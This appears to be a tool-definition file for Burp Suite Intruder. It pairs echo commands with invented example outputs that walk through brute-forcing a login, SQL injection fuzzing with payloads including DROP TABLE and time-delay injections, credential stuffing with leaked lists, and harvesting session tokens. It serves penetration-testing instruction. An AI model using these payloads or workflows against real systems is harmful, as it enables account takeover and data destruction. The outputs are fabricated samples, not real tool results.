name: burp_suite_intruder
description: Automated fuzzing, brute force, and parameter testing using Burp Suite Intruder

args: echo 'Send request to Intruder (Ctrl+I)' && echo 'Select attack positions by highlighting values and clicking Add §'

expected_output.example:
Intruder configured with attack positions:

POST /login HTTP/1.1
Host: testsite.com
Content-Type: application/x-www-form-urlencoded

username=§admin§&password=§password123§

Attack positions marked with § symbols:
  Position 1: username value
  Position 2: password value

Ready to configure payload sets

args: echo 'Configure Intruder attack:' && echo 'Attack type: Cluster bomb (tests all combinations)' && echo 'Payload set 1: Load username list (admin, root, user)' && echo 'Payload set 2: Load password list (password, 123456, admin)'

expected_output.example:
Intruder attack configured:

Attack type: Cluster bomb
  Tests all combinations: 3 usernames × 3 passwords = 9 requests

Payload sets:
  Set 1 (username): admin, root, user
  Set 2 (password): password, 123456, admin

Intruder will generate requests:
  1. username=admin&password=password
  2. username=admin&password=123456
  3. username=admin&password=admin
  4. username=root&password=password
  ...
  9. username=user&password=admin

args: echo 'Start attack' && echo 'Monitor results table for successful login'

expected_output.example:
Intruder attack running...

Results:
#  | Payload1 | Payload2   | Status | Length | Response Time
1  | admin    | password   | 401    | 523    | 234ms
2  | admin    | 123456     | 401    | 523    | 245ms
3  | admin    | admin      | 200    | 2847   | 456ms ← Success!
4  | root     | password   | 401    | 523    | 238ms
5  | root     | 123456     | 401    | 523    | 241ms
6  | root     | admin      | 401    | 523    | 239ms
7  | user     | password   | 401    | 523    | 243ms
8  | user     | 123456     | 200    | 2847   | 447ms ← Success!
9  | user     | admin      | 401    | 523    | 237ms

Credentials found:
  admin:admin (200 OK, 2847 bytes)
  user:123456 (200 OK, 2847 bytes)

args: echo 'Sniper attack for SQLi fuzzing:' && echo 'Position: GET /search?q=§test§' && echo 'Payload: SQL injection payloads from list'

expected_output.example:
Sniper attack for SQLi testing:

Target: GET /search?q=§payload§ HTTP/1.1

Payloads tested (showing 5 of 50):
  1. test' OR '1'='1
  2. test' UNION SELECT NULL--
  3. test' AND 1=1--
  4. test'; DROP TABLE users--
  5. test' WAITFOR DELAY '0:0:5'--

Results analysis:
  Payload #1: 200 OK, 15234 bytes (much larger - likely vulnerable)
  Payload #2: 500 Error (SQL syntax error exposed)
  Payload #3: 200 OK, 523 bytes (normal response)
  Payload #5: Response time 5234ms (5 second delay detected - time-based SQLi confirmed)

args: echo 'Pitchfork attack for credential stuffing:' && echo 'username=§user1§&password=§pass1§' && echo 'Paired lists: leaked_users.txt + leaked_passwords.txt'

expected_output.example:
Pitchfork attack (parallel iteration):

Payload sets:
  Set 1: alice, bob, charlie, david
  Set 2: Alice123!, Bob2024, Charlie99, David@Pass

Intruder tests paired credentials:
  Request 1: alice:Alice123!
  Request 2: bob:Bob2024
  Request 3: charlie:Charlie99
  Request 4: david:David@Pass

Results:
  alice:Alice123! → 200 OK ✓ Valid credentials
  bob:Bob2024 → 401 Unauthorized
  charlie:Charlie99 → 200 OK ✓ Valid credentials
  david:David@Pass → 401 Unauthorized

2 of 4 credential pairs work - credential stuffing successful

args: echo 'Grep - Extract feature:' && echo 'Add grep match for: Set-Cookie' && echo 'Extract session tokens from responses'

expected_output.example:
Intruder Grep - Extract configured:

Pattern: Set-Cookie: session=([^;]+)

Results with extracted values:
#  | Username | Password | Status | Extracted Token
1  | admin    | admin    | 200    | eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
2  | user     | 123456   | 200    | eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Extracted session tokens can be used for further testing
Export results to CSV with tokens for automated exploitation
